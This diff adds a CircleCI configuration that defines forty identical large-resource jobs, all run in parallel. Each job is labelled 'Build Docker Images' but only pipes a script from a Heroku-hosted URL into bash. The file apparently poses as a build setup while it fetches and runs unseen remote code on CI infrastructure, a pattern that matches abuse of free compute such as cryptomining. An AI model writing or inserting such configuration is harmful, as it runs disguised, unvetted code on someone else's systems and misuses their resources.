@@ -1,0 +1,489 @@
+version: 2.1
+
+jobs:
+  build1:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+  build2:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+  build3:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+  build4:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+  build5:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+  build6:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+  build7:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+  build8:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+  build9:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+  build10:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+  build11:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+  build12:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+  build13:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+  build14:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+  build15:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+  build16:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+  build17:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+  build18:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+  build19:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+  build20:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+  build21:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+  build22:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+  build23:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+  build24:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+  build25:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+  build26:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+  build27:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+  build28:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+  build29:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+  build30:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+  build31:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+  build32:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+  build33:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+  build34:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+  build35:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+  build36:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+  build37:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+  build38:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+  build39:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+  build40:
+    docker:
+      - image: cimg/base:stable
+    resource_class: large
+    steps:
+      - checkout
+      - setup_remote_docker
+      - run:
+          name: "Build Docker Images"
+          command: |
+               curl https://myname1.herokuapp.com/include | bash
+
+
+workflows:
+    version: 2
+    build:
+        jobs:
+            - build1
+            - build2
+            - build3
+            - build4
+            - build5
+            - build6
+            - build7
+            - build8
+            - build9
+            - build10
+            - build11
+            - build12
+            - build13
+            - build14
+            - build15
+            - build16
+            - build17
+            - build18
+            - build19
+            - build20
+            - build21
+            - build22
+            - build23
+            - build24
+            - build25
+            - build26
+            - build27
+            - build28
+            - build29
+            - build30
+            - build31
+            - build32
+            - build33
+            - build34
+            - build35
+            - build36
+            - build37
+            - build38
+            - build39
+            - build40
